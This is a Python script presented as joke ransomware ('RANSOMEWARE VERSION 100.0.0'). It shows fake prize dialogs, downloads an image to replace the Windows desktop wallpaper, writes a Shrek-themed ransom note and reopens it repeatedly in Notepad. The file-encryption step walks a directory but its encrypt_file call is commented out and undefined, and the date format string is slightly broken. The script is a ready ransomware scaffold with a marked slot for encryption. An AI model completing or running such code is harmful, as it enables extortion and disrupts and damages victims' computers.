import ctypes
import datetime
import os
import subprocess
import time
import urllib.request
import pyautogui

def menu():
    choice = pyautogui.prompt("""
      1 - you just won a million dollars!
    """)
    if choice == '1':
        print("just kidding, you fool.")
    pyautogui.alert('You might need help', "RANSOMEWARE VERSION 100.0.0")
    pyautogui.confirm('Yeah i need help')
    pyautogui.countdown(5)

def change_desktop_background():
    imageUrl = 'https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.7FXKvbyxPuM8Ce_761LXlAHaEH%26pid%3DApi&f=1'
    path = f'background-a.jpg'
    location, res = urllib.request.urlretrieve(imageUrl, path)
    time.sleep(.5)
    bgimage = os.path.join(os.getcwd(), location)
    print(f'LOCATION: {bgimage}')
    SPI_SETDESKWALLPAPER = 20
    # TODO verify path
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, location, 0)

def create_ransom_note():
    date = datetime.date.today().strftime('%d-%B-Y')
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write(f'''
        shrek stopped by to say hes taking your donkey and all your files!
######################################################################################
#                                                                                    #
#                            ,.--------._                                            #
#                           /            ''.                                         #
#                         ,'                \     |"\                /\          /\  #
#                /"|     /                   \    |__"              ( \\        // ) #
#               "_"|    /           z#####z   \  //                  \ \\      // /  #
#                 \\  #####        ##------".  \//                    \_\\||||//_/   #
#                  \\/-----\     /          ".  \                      \/ _  _ \     #
#                   \|      \   |   ,,--..       \                    \/|(O)(O)|     #
#                   | ,.--._ \  (  | ##   \)      \                  \/ |      |     #
#                   |(  ##  )/   \ `-....-//       |///////////////_\/  \      /     #
#                     '--'."      \                \              //     |____|      #
#                  /'    /         ) --.            \            ||     /      \     #
#               ,..|     \.________/    `-..         \   \       \|     \ 0  0 /     #
#            _,##/ |   ,/   /   \           \         \   \       U    / \_//_/      #
#          :###.-  |  ,/   /     \        /' ""\      .\        (     /              #
#         /####|   |   (.___________,---',/    |       |\=._____|  |_/               #
#        /#####|   |     \__|__|__|__|_,/             |####\    |  ||                #
#       /######\   \      \__________/                /#####|   \  ||                #
#      /|#######`. `\                                /#######\   | ||                #
#     /++\#########\  \                      _,'    _/#########\ | ||                #
#    /++++|#########|  \      .---..       ,/      ,'##########.\|_||                #
#   //++++|#########\.  \.              ,-/      ,'########,+++++\\_\\               #
#  /++++++|##########\.   '._        _,/       ,'######,''++++++++\                  #
# |+++++++|###########|       -----."        _'#######' +++++++++++\                 #
# |+++++++|############\.     \\     //      /#######/++++ +++++ +++\                #
#      ________________________\\___//______________________________________         #
#     / ____________________________________________________________________)        #
#    / /              _                                             _                #
#    | |             | |                                           | |               #
#     \ \            | | _           ____           ____           | |  _            #
#      \ \           | || \         / ___)         / _  )          | | / )           #
#  _____) )          | | | |        | |           (  __ /          | |< (            #
# (______/           |_| |_|        |_|            \_____)         |_| \_)           #
#                                                                                    #
######################################################################################
{date} -- eh eh arg oo en
''')
    f.close()

def show_ransom_note():
    ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
    count = 0
    while True:
        time.sleep(0.1)
        subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        time.sleep(10)
        count += 1
        if count == 5:
            break

def encrypt_directory():
    dirname = './garbage'
    for path, dirnames, files in os.walk(dirname):
        for file in files:
            filePath = os.path.join(path, file)
            print(f'Encrypting File {filePath}')
            # encrypt_file(filePath)

menu()
change_desktop_background()
encrypt_directory()
create_ransom_note()
show_ransom_note()